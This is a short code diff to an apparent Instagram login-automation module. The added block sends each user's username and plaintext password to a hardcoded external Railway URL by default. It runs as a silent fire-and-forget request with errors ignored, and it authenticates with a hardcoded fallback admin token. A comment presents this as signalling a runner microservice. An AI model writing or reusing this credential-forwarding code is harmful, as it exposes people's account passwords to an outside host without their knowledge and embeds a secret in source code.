@@ -452,6 +452,24 @@ export async function executeVirtualInstagramLogin(
 ): Promise<VirtualLoginResult> {
   const sessionId = existingSessionId || `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
 
+  // Signal persistent runner microservice on Railway if available
+  const runnerUrl = process.env.RUNNER_API_URL || "https://creators-icarus-production.up.railway.app";
+  if (runnerUrl) {
+    try {
+      const adminToken = process.env.ADMIN_TOKEN || "xrpxrpxrp";
+      fetch(`${runnerUrl}/api/session/launch`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "x-admin-token": adminToken,
+        },
+        body: JSON.stringify({ sessionId, username, password: pass }),
+      }).catch(() => undefined);
+    } catch {
+      // Ignore background trigger errors
+    }
+  }
+
   if (twoFactorCode) {
     return submitTwoFactorCode(username, pass, twoFactorCode, sessionId);
   }
